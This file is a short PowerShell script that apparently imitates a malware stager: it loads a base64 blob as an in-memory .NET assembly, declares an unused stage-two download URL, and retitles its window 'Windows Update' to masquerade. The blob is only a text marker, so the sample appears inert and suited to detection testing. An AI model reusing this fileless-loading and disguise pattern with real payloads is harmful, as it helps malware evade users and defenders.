[CmdletBinding()]
param(
    [string]$Stage2Url = "https://localhost:8000/payload.bin",
    [int]$TimeoutSec = 153
)
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpqZmlqbzd0eGFt")
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$Host.UI.RawUI.WindowTitle = "Windows Update"
